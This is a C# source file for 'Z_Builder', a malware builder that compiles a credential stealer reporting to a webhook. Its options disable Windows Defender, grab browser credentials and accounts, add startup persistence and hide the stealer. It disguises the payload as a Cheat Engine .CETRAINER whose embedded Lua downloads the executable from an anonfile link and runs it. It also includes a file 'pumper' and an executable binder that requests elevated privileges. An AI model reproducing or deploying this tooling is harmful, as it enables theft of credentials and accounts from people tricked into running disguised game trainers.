using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using AnonFileAPI;
using System.Diagnostics;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using MetroFramework.Forms;

namespace Z_Builder
{
    public partial class Form2 : MetroFramework.Forms.MetroForm
    {
        List<string> alldata { get; set; }
        string IcoFilePath { get; set; }
        public Form2(string ID, string LicenseKey)
        {
            InitializeComponent();
            metroTextBox8.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/EjyNVk6f");
            metroTextBox9.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/d8LcaGtW");
            metroTextBox10.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/eXJtr8TR");
            metroLabel6.Text = ID;
            metroTextBox2.Text = LicenseKey;
            metroTextBox3.Hide();
            metroTextBox4.Hide();
        }
        private void folderBrowserDialog1_HelpRequest(object sender, EventArgs e)
        {

        }
        #region Builder
        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {

        }
        private void metroCheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox4.Checked == true)
            {
                metroTextBox3.Show();
                metroTextBox4.Show();
            }
            else
            {
                metroTextBox3.Hide();
                metroTextBox4.Hide();
            }
        }
        private void metroButton3_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(metroTextBox5.Text))
            {
                if (metroCheckBox8.Checked == true)
                {
                    System.Windows.Forms.SaveFileDialog sfd = new System.Windows.Forms.SaveFileDialog();
                    sfd.FileName = "Stealer.CETRAINER";
                    sfd.Filter = "CETRAINER files (*.CETRAINER)|*.CETRAINER";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        sfd.FileName = Path.GetDirectoryName(sfd.FileName) + "\\" + Path.GetFileNameWithoutExtension(sfd.FileName) + ".exe";
                        compile(sfd.FileName);
                    }
                }
                else
                {
                    System.Windows.Forms.SaveFileDialog sfd = new System.Windows.Forms.SaveFileDialog();
                    sfd.FileName = "Stealer.exe";
                    sfd.Filter = "Exe files (*.exe)|*.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        compile(sfd.FileName);
                    }
                }
            }
            else
            {
                MessageBox.Show("Missing webhook URL");
            }
        }
        public void compile(string path)
        {
            if (metroCheckBox4.Checked == true)
            {
                if (metroTextBox3.Text.Length > 45)
                {
                    MessageBox.Show("Title too long!");
                    return;
                }
                if (metroTextBox4.Text.Length > 45)
                {
                    MessageBox.Show("Message too long!");
                    return;
                }
            }
            if (metroCheckBox9.Checked != true)
            {
                DialogResult dialogResult = MessageBox.Show("There is a chance that reg files may not send if you dont have Disable WinDefender (feature) enabled. Are you sure you want to continue building the stealer?", "Warning", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                }
                else if (dialogResult == DialogResult.No)
                {
                    return;
                }
            }
            try { File.Delete(path); } catch { }
            //[ID]==[WebHook_URL]==[Path]==[AAPData]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]--[BrowserCreds:(Y/N)]==[Title]==[Message]==
            string command = "";
            command += metroTextBox2.Text + "==[" + metroTextBox5.Text + "]==["+ path + "]==";
            command += "[" + Get5RND() + "]--[" + Get9RND() + "]--[" + grab5keys() + "]--[" + grab9keys() + "]==";
            if (metroCheckBox9.Checked == true)
            {
                command += "[DisableProt:(Y)]--";
            }
            else
            {
                command += "[DisableProt:(N)]--";
            }
            if (metroCheckBox1.Checked == true)
            {
                command += "[Tracer:(Y)]--";
            }
            else
            {
                command += "[Tracer:(N)]--";
            }
            if (metroCheckBox10.Checked == true)
            {
                command += "[Recover:(Y)]--";
            }
            else
            {
                command += "[Recover:(N)]--";
            }
            if (metroCheckBox7.Checked == true)
            {
                command += "[GetAllAccs:(Y)]--";
            }
            else
            {
                command += "[GetAllAccs:(N)]--";
            }
            if (metroCheckBox5.Checked == true)
            {
                command += "[DeleteGT:(Y)]--";
            }
            else
            {
                command += "[DeleteGT:(N)]--";
            }
            if (metroCheckBox6.Checked == true)
            {
                command += "[StartUp:(Y)]--";
            }
            else
            {
                command += "[StartUp:(N)]--";
            }
            if (metroCheckBox2.Checked == true)
            {
                command += "[HideStealer:(Y)]--";
            }
            else
            {
                command += "[HideStealer:(N)]--";
            }
            if (metroCheckBox3.Checked == true)
            {
                command += "[BrowserCreds:(Y)]==";
            }
            else
            {
                command += "[BrowserCreds:(N)]==";
            }
            if (metroCheckBox4.Checked == true && metroTextBox3.Text != "" && metroTextBox4.Text != "")
            {
                command += "[" + metroTextBox3.Text + "]==[";
                command += metroTextBox4.Text + "]==";
            }
            else
            {
                command += "[+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-]==[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-]==";
            }
            try
            {
                command = command.Replace(" ", "[SPACE]");
            }
            catch { }
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "cmd /c Z-BuilderCL.exe " + command;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
            p.Start();
            p.WaitForExit();
            string StealerBasePath = Environment.ExpandEnvironmentVariables("%TEMP") + "\\StealerBase.exe";
            try { File.Delete(StealerBasePath); } catch { }
            if (metroCheckBox8.Checked == true)
            {
                using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
                {
                    AnonFile anonFile = anonFileWrapper.UploadFile(path);
                    string DownloadPath = anonFileWrapper.GetDirectDownloadLinkFromLink(anonFile.FullUrl);
                    string CetrainerCode = "function lolokieZ(boops)local beepboop = (5*3-2/8+9*2/9+8*3) end function lolokieZ(blahblah)local beepboop = (5*3-2/8+9*2/9+8*3) end local beepboop = (5*3-2/8+9*2/9+8*3) local url = '" + DownloadPath + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\ZBCT.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\\\ZBCT.exe')";
                    string path2 = Path.GetDirectoryName(path) + "\\" + Path.GetFileNameWithoutExtension(path) + ".CETRAINER";
                    File.WriteAllText(path2, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"29\">\n  <CheatEntries/>\n  <UserdefinedSymbols/>\n  <LuaScript>\n" + CetrainerCode + "\n</LuaScript>\n</CheatTable>");
                }
                File.Delete(path);
                MessageBox.Show("Stealer compiled!");
            }
            else
            {
                MessageBox.Show("Stealer compiled!");
            }
        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void metroCheckBox10_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void metroCheckBox7_CheckedChanged(object sender, EventArgs e)
        {
        }
        public static string Get5RND()
        {
            try
            {
                RegistryKey jdfddnjdz = Registry.CurrentUser;
                jdfddnjdz = jdfddnjdz.OpenSubKey(@"Software\Microsoft", true);
                string[] dshg = jdfddnjdz.GetSubKeyNames();
                foreach (String umm in dshg)
                {
                    if (Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length == 5)
                    {
                        return umm;
                    }
                    else if (!Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length != 5)
                    {

                    }
                }
                return "NULL";
            }
            catch
            {
                return "NULL";
            }
        }
        public static string Get9RND()
        {
            try
            {
                RegistryKey subKey = Registry.CurrentUser;
                string[] subkeyNemez = subKey.GetSubKeyNames();
                foreach (String valuef in subkeyNemez)
                {
                    if (Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length == 9)
                    {
                        return valuef;
                    }
                    else if (!Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length != 9)
                    {

                    }
                }
                return "NULL";
            }
            catch
            {
                return "NULL";
            }
        }
        public static string grab5keys()
        {
            string f5keys = "";
            RegistryKey reg5num = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft");
            foreach (string subKeyName in reg5num.GetSubKeyNames())
            {
                if (Regex.IsMatch(subKeyName, "^[0-9]+$", RegexOptions.Compiled) && subKeyName.Length == 5)
                {
                    RegistryKey og = reg5num.OpenSubKey(subKeyName);
                    foreach (var ggfg in og.GetValueNames())
                    {
                        f5keys += ggfg + ",";
                    }
                }
            }
            return f5keys.TrimEnd(',');
        }
        public static string grab9keys()
        {
            string f9keys = "";
            RegistryKey subKey = Registry.CurrentUser;
            foreach (string subKeyName in subKey.GetSubKeyNames())
            {
                if (Regex.IsMatch(subKeyName, "^[0-9]+$", RegexOptions.Compiled) && subKeyName.Length == 9)
                {
                    RegistryKey ghjk = subKey.OpenSubKey(subKeyName);
                    string[] okg = subKey.OpenSubKey(subKeyName).GetValueNames();
                    foreach (var s in okg)
                    {
                        //string gdg = (string)ghjk.GetValue(s);
                        f9keys += s + ",";
                    }
                    break;
                }
            }
            return f9keys.TrimEnd(',');
        }
        #endregion
        #region Pumper
        private void metroButton9_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.OpenFileDialog ofd = new System.Windows.Forms.OpenFileDialog();
            ofd.Filter = "Exe Files (.exe)|*.exe|All Files (*.*)|*.*";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                metroTextBox11.Text = ofd.FileName;
            }
        }
        private void metroCheckBox11_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox11.Checked == true)
            {
                metroCheckBox12.Checked = false;
            }
            else
            {
                metroCheckBox12.Checked = true;
            }
        }
        private void metroCheckBox12_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox12.Checked == true)
            {
                metroCheckBox11.Checked = false;
            }
            else
            {
                metroCheckBox11.Checked = true;
            }
        }
        private void metroButton8_Click(object sender, EventArgs e)
        {
            if (File.Exists(metroTextBox11.Text))
            {
                if (metroCheckBox11.Checked == true)
                {
                    FileStream file = File.OpenWrite(metroTextBox11.Text);
                    long ende = file.Seek(0, SeekOrigin.End);
                    decimal groesse = numericUpDown1.Value * 1048;
                    while (ende < groesse)
                    {
                        ende++;
                        file.WriteByte(0);
                    }
                    file.Close();
                    MessageBox.Show("File pumped!");
                }
                else if (metroCheckBox12.Checked == true)
                {
                    FileStream file = File.OpenWrite(metroTextBox11.Text);
                    long ende = file.Seek(0, SeekOrigin.End);
                    decimal groesse = numericUpDown1.Value * 1048576;
                    while (ende < groesse)
                    {
                        ende++;
                        file.WriteByte(0);
                    }
                    file.Close();
                    MessageBox.Show("File pumped!");
                }
                else
                {
                    MessageBox.Show("Select KB or MB");
                }
            }
            else
            {
                MessageBox.Show("Bad File or no file path chosen!");
            }
        }
        #endregion
        #region Binder
        private void metroButton1_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.SaveFileDialog sfd = new System.Windows.Forms.SaveFileDialog();
            sfd.FileName = "Binded.exe";
            sfd.Filter = "Exe files (*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                string CompiledLocation = sfd.FileName;
                if (listView1.Items.Count > 0)
                {
                    if (metroComboBox1.Text == "")
                    {
                        MessageBox.Show("Drop path required for binded files");
                        return;
                    }
                    string basicBinderSrc = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/JYtau5ax");
                    string cd = basicBinderSrc;
                    string ExtractFiles = "";
                    foreach (ListViewItem items in listView1.Items)
                    {
                         ExtractFiles += "Extract(\"" + Path.GetFileName(items.SubItems[0].Text) + "\",\"" + metroComboBox1.Text + "\"," + items.SubItems[1].Text + ");";
                    }
                    cd = cd.Replace("//BinderStuffs", ExtractFiles);
                    List<string> code = new List<string>();
                    code.Add(cd);
                    string manifest = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""highestAvailable"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
                    File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifest);
                    CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
                    CompilerParameters compars = new CompilerParameters();
                    compars.ReferencedAssemblies.Add("System.dll");
                    compars.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
                    compars.ReferencedAssemblies.Add("System.IO.dll");
                    compars.ReferencedAssemblies.Add("System.Reflection.dll");
                    compars.GenerateExecutable = true;
                    compars.CompilerOptions = "/target:winexe";
                    compars.OutputAssembly = CompiledLocation;
                    compars.GenerateInMemory = false;
                    compars.TreatWarningsAsErrors = false;
                    foreach (ListViewItem item in listView1.Items)
                    {
                        compars.EmbeddedResources.Add("" + item.SubItems[0].Text + "");
                    }
                    if (!string.IsNullOrEmpty(metroTextBox1.Text) || !string.IsNullOrWhiteSpace(metroTextBox1.Text) && metroTextBox1.Text.Contains(@"\") && metroTextBox1.Text.Contains(@":") && metroTextBox1.Text.Length >= 7)
                    {
                        compars.CompilerOptions += " /win32icon:" + @"""" + metroTextBox1.Text + @"""";
                    }
                    CompilerResults res = provider.CompileAssemblyFromSource(compars, code.ToArray());
                    if (res.Errors.Count > 0)
                    {
                        try
                        {
                            File.Delete(Application.StartupPath + @"\manifest.manifest");
                        }
                        catch { }
                        foreach (CompilerError ce in res.Errors)
                        {
                            MessageBox.Show(ce.ToString());
                        }
                    }
                    else
                    {
                        try
                        {
                            File.Delete(Application.StartupPath + @"\manifest.manifest");
                            MessageBox.Show("Executables binded!");
                        }
                        catch { }
                    }
                }
            }
        }
        private void metroButton5_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.OpenFileDialog ofd = new System.Windows.Forms.OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string[] BindedFileInfo = { ofd.FileName, "false"};
                ListViewItem BindedList = new ListViewItem(BindedFileInfo);
                listView1.Items.Add(BindedList);
            }
            else
            {
                return;
            }
        }
        private void metroButton6_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                try
                {
                    listView1.SelectedItems[0].Remove();
                }
                catch { }
            }
        }
        private void metroButton2_Click_1(object sender, EventArgs e)
        {
            using (System.Windows.Forms.OpenFileDialog openFileDialog = new System.Windows.Forms.OpenFileDialog())
            {
                System.Windows.Forms.OpenFileDialog dialog = new System.Windows.Forms.OpenFileDialog();
                dialog.Filter = "Ico files (*ico)|*.ico";
                dialog.Title = "Select an ico file";
                DialogResult result = dialog.ShowDialog();
                if (result == DialogResult.OK)
                {
                    pictureBox2.Load(dialog.FileName);
                    pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
                    IcoFilePath = dialog.FileName;
                    metroTextBox1.Clear();
                    metroTextBox1.Text = IcoFilePath;
                }
            }
        }
        private void metroButton7_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems[0].SubItems[1].Text == "true")
                {
                    listView1.SelectedItems[0].SubItems[1].Text = "false";
                }
                else if (listView1.SelectedItems[0].SubItems[1].Text == "false")
                {
                    listView1.SelectedItems[0].SubItems[1].Text = "true";
                }
            }
            catch { }
        }
        #endregion
    }
}